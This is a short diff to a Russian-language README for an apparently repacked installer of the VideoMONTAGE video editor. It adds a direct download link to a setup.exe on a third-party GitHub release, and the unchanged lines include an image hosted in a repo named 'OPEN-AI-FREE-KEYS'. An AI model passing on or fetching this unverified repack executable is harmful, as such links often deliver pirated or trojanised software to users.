@@ -78,6 +78,8 @@
 - 5. Возможность использования альтернативной Коллекции музыки (подхватывается репаком)
 - 6. Подхватывает внешний файл настроек settings.reg (если находится рядом с инсталлятором)
  
+  7. СКАЧАТЬ ПРОГРАММУ:[https://github.com/nop-74/VideoMONTAGE-24.0/releases/download/video/VideoMONTAGE.24.1_setup.exe]
+ 
 ## Угостить меня Кофе
 
 ![Alt text](https://github.com/nop-74/OPEN-AI-FREE-KEYS/blob/main/100.jpg)
